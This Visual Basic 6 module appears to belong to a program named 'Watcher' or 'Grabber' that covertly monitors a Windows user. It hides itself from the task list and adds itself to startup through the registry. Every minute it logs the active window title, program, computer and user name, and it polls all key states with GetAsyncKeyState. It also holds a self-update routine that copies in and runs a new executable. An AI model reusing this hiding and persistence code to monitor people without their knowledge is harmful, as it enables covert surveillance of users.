Attribute VB_Name = "Module1"
Option Explicit
Private Declare Function GetCurrentProcessId Lib "KERNEL32" () As Long
Private Declare Function RegisterServiceProcess Lib "KERNEL32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Global Baza As Database
Global WrkSpace As Workspace
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Global DoNotWait As Boolean
Global RunLevel As Integer
Global DebugLevel As Integer
Global OnError As Integer

Sub Main()
    '- Init all variables -
    Dim Wait As Long
    Dim AccTitle As String
    Dim AccProdName As String
    Dim AccExeName As String
    Dim AccUserName As String
    Dim AccCompName As String
    Dim Datum As Date
    Dim dd As String
    Dim rec As Recordset
    Dim Tipke As Boolean
    Dim X As Integer
    Dim n As Integer
    Dim w As Long
    Dim pid As Long, regserv As Long
    Dim newpath As String, txt As String
    Dim newexe As String
    
    '- Init all param's -

Start:
    If App.PrevInstance = True Then
       If LCase(Command) = "/setup" Then Form2.Visible = True
       Exit Sub
    End If
    'DebugLevel = 5
    If Form1.Winsock1.State = 0 Then
      Form1.Winsock1.Protocol = sckUDPProtocol
      Form1.Winsock1.RemotePort = 30000
      Form1.Winsock1.LocalPort = 30010
      Form1.Winsock1.RemoteHost = "127.0.0.1"
      Form1.Winsock1.SendData ""
    Else
      SendDebug "Skiped Sock config.", 2
    End If

    SendDebug "System Starting", 1
    SendDebug "Switching into runlevel 1", 1
    SendDebug "Setting main parameters", 1
    
    If getVersion = 1 Then Win32 = True
    
     If OnError = 0 Then
      On Error Resume Next
      SendDebug "On error I will resume next.", 2
    Else
      On Error GoTo 0
      SendDebug "On error I will do nothing.", 2
    End If
    
    pid = GetCurrentProcessId()
    If Win32 Then regserv = RegisterServiceProcess(pid, 1)
    
    App.TaskVisible = False
    
    SaveString HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Watcher", App.Path & "\" & App.EXEName & ".exe"
    newpath = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "NewVersion")
    On Error GoTo Preskok
    If newpath <> "" Then
      Open newpath For Input As #99
         Line Input #99, txt
         If Mid(txt, 1, 1) > App.Major Then
            Line Input #99, txt
            X = 1
            Do Until InStr(X, txt, "\") = 0
               X = InStr(X, txt, "\") + 1
            Loop
            newexe = Mid(txt, X)
            FileCopy txt, App.Path & "\" & newexe
            DelSetting HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber"
            X = Shell(App.Path & "\" & newexe)
            End
         ElseIf Mid(txt, 1, 1) = App.Major And Mid(txt, 3, 1) > App.Minor Then
            Line Input #99, txt
            X = 1
            Do Until InStr(X, txt, "\") = 0
               X = InStr(X, txt, "\") + 1
            Loop
            newexe = Mid(txt, X)
            FileCopy txt, App.Path & "\" & newexe
            DelSetting HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber"
            X = Shell(App.Path & "\" & newexe)
            End
         ElseIf Mid(txt, 1, 1) = App.Major And Mid(txt, 3, 1) = App.Minor And Mid(txt, 5, 1) > App.Revision Then
            Line Input #99, txt
            X = 1
            Do Until InStr(X, txt, "\") = 0
               X = InStr(X, txt, "\") + 1
            Loop
            newexe = Mid(txt, X)
            FileCopy txt, App.Path & "\" & newexe
            DelSetting HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber"
            X = Shell(App.Path & "\" & newexe)
            End
         End If
      Close #99
    End If
Preskok:
    Err = 0
    If OnError = 0 Then
      On Error Resume Next
    Else
      On Error GoTo 0
    End If
    DBEngine.CompactDatabase App.Path & "\Data.mdb", App.Path & "\CData.mdb", , "PWD=enigma", ";PWD=enigma"
    Kill App.Path & "\data.mdb"
    If Err > 0 Then SendDebug Error, 3
    Err = 0
    FileCopy App.Path & "\cdata.mdb", App.Path & "\data.mdb"
    If Err > 0 Then SendDebug Error, 3
    Err = 0
    Kill App.Path & "\cdata.mdb"
    If Err > 0 Then SendDebug Error, 3
    Err = 0
    Set WrkSpace = DBEngine.CreateWorkspace("Grabber", "admin", "")
    If Err > 0 Then SendDebug Error, 3
    Err = 0
    Set Baza = WrkSpace.OpenDatabase(App.Path & "\Data.mdb", False, False, ";PWD=enigma")
    If Err > 0 Then SendDebug Error, 3
    Err = 0
    
    dd = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "ExDate")
    If dd = "" Then dd = 30
    If dd <> "" Then
        SendDebug "Erasing Old Records...", 2
        Datum = DateAdd("d", CInt(dd) * -1, Date)
        Baza.Execute "DELETE FROM Podatki WHERE Datum < cvdate('" & Datum & "')"
        SendDebug "Records Deleted From Podatki: " & Baza.RecordsAffected, 2
        Baza.Execute "DELETE FROM Tipke WHERE Datum < cvdate('" & Datum & "')"
        SendDebug "Records Deleted From Tipke: " & Baza.RecordsAffected, 2
        SendDebug "...Done", 2
    End If
    If Err > 0 Then SendDebug Error, 3
    If Err > 0 Then SendDebug Error, 3
    '- Main Loop -
    Wait = Timer
    RunLevel = 5
    SendDebug "Switching into runlevel 5", 1
    SendDebug "Entering main loop!", 1
    
    Do While RunLevel = 5
        If Wait < Timer Then
            If Err > 0 Then SendDebug Error, 3
            SendDebug "WRITING DATA", 1
            SendDebug Timer & " -> " & Timer + 60, 2
            Wait = Timer + 60
            If Wait > 86400 Then Wait = 0
            
            AccTitle = Elimenate(GetActiveWindowTitle(False))
            AccExeName = Elimenate(GetExe(GetActiveWindow(False)))
            SendDebug "Title:         " & AccTitle, 2
            SendDebug "ExeName:       " & AccExeName, 2
            If AccExeName = App.ProductName Then
                AccExeName = "Windows Desktop"
                AccTitle = " "
            End If
            AccCompName = Elimenate(GetComputerName)
            SendDebug "Computer Name: " & AccCompName, 2
            AccUserName = Elimenate(GetUserName)
            SendDebug "User Name:     " & AccUserName, 2
            If Err > 0 Then SendDebug Error, 3
            Err = 0
            SendDebug "Open Recordset:  Podatki", 2
            
            Set rec = Baza.OpenRecordset("SELECT * FROM Podatki WHERE Datum = cvdate('" & Date & "') AND ProgramTitle = '" & AccTitle & "'")
            SendDebug "Recordset EOF = " & rec.EOF, 2
            If rec.EOF Then
                Baza.Execute "INSERT INTO Podatki " _
                & "(ProgramName, ProgramTitle, " _
                & "Racunalnik, Uporabnik, Datum, Duration) VALUES (" _
                & "'" & AccExeName & "','" & AccTitle & "'," _
                & "'" & AccCompName & "','" & AccUserName & "'," _
                & "'" & Date & "',1)"
            Else
                Baza.Execute "UPDATE Podatki SET Duration = " & rec!duration + 1 & " WHERE ID = " & rec!id
            End If
            SendDebug "Writing data into Podatki complete", 2
            SendDebug "Recordset affected : " & Baza.RecordsAffected, 2
            'Datum = CvDate('" & Date & "') AND
            SendDebug "Open Recordset:  Tipke", 2
            Set rec = Baza.OpenRecordset("SELECT * FROM Tipke WHERE Datum > CvDate('" & Date & "') ORDER BY Datum DESC")
            SendDebug "Recordset EOF = " & rec.EOF, 2
            If Err > 0 Then SendDebug Error, 3
            If rec.EOF Then
                Baza.Execute "INSERT INTO Tipke (Datum, KeyState, Duration) VALUES " _
                & "('" & Now & "','" & Tipke & "',1)"
            Else
                If rec!keyState <> Tipke Then
                    Baza.Execute "INSERT INTO Tipke (Datum, KeyState, Duration) VALUES " _
                    & "('" & Now & "','" & Tipke & "',1)"
                Else
                    Baza.Execute "UPDATE Tipke SET Duration = " & rec!duration + 1 & " WHERE ID = " & rec!id
                End If
            End If
            SendDebug "Writing data into Tipke complete", 2
            SendDebug "Recordset affected : " & Baza.RecordsAffected, 2
            SendDebug "FINISH.", 1
            Tipke = False
            If Err > 0 Then SendDebug Error, 3
        End If
        SendDebug "Checking for KeyPress", 1
        Do Until Timer >= Wait
            If DoNotWait = False Then Sleep 150
            For X = 1 To 255
                n = GetAsyncKeyState(X)
                DoEvents
                Form1.Winsock1_DataArrival (255)
                If n = -32767 Then
                    If Err > 0 Then SendDebug Error, 3
                    Tipke = True
                    SendDebug "Key " & X & " was presed.", 2
                    Do Until Timer >= Wait
                        Form1.Winsock1_DataArrival (255)
                        If DoNotWait = False Then Sleep 150
                        DoEvents
                    Loop
                    Exit For
                End If
            Next X
        Loop
        If Err > 0 Then SendDebug Error, 3
    Loop
    If RunLevel = 6 Then
      SendDebug "This sistem is going into reboot now!", 1
      SendDebug "removing variables....", 2
      Wait = 0
      n = 0
      SendDebug "Closing recordset....", 2
      rec.Close
      Set rec = Nothing
      SendDebug "recordest is closed and removed.", 2
      SendDebug "Closing DataBase....", 2
      Baza.Close
      Set Baza = Nothing
      SendDebug "database is closed and removed.", 2
      SendDebug "Closing WorkSpace....", 2
      Set WrkSpace = Nothing
      SendDebug "workspace is closed and removed.", 2
      SendDebug "STAND BY WHILE REBOOTing", 1
      GoTo Start
    ElseIf RunLevel = 0 Then
      SendDebug "Terminating Program", 1
      Unload Form1
      End
    End If
    End
End Sub

Function Elimenate(txt As String) As String
    Dim txt2 As String, char As String
    Dim X As Integer
    
    If InStr(1, txt, "'") > 0 Or InStr(1, txt, "|") > 0 Then
        For X = 1 To Len(txt)
            char = Mid(txt, X, 1)
            If char <> "'" And char <> "|" Then
                txt2 = txt2 & char
            End If
        Next X
    Else
        txt2 = txt
    End If
    Elimenate = txt2
End Function
Sub SendDebug(txt As String, Level As Integer)
'   Open App.Path & "\error.msg" For Append As #66
'      Print #66, Level & ":" & txt
'   Close #66
   Debug.Print txt
   If DebugLevel = 0 Then Exit Sub
   If DebugLevel >= Level Then
      Send txt
   End If
   Err = 0
End Sub

Sub Send(txt As String)
   Form1.Winsock1.SendData txt
   Form1.Timer2.Tag = txt
   Form1.Timer2.Enabled = True
End Sub
